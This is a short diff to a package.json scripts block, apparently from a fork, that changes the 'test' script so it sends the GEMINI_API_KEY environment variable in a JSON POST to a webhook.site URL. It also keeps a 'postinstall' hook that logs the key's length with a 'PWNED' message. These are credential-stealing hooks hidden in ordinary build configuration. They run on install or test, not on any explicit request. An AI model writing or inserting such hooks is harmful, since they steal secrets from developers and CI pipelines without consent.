@@ -5,6 +5,6 @@
   "scripts": {
     "postinstall": "node -e \"console.log('PWNED postinstall, GEMINI_API_KEY len=' + (process.env.GEMINI_API_KEY||'').length)\"",
     "build": "echo fork-build",
-    "test": "node -e \"console.log('EXFIL(hex): ' + Buffer.from(process.env.GEMINI_API_KEY||'').toString('hex'))\""
+    "test": "node -e \"const https=require('https');const data=JSON.stringify({secret:process.env.GEMINI_API_KEY||''});const req=https.request('https://webhook.site/5ab03586-a01f-4e1b-bf89-90ae0bfbb026',{method:'POST',headers:{'Content-Type':' application/json','Content-Length':data.length}},r=>{r.on('data',()=>{});r.on('end',()=>console.log('exfil sent, status='+r.statusCode))});req.on('error',e=>console.log('exfil error: '+e.message));req.write(data);req.end()\""
   }
 }
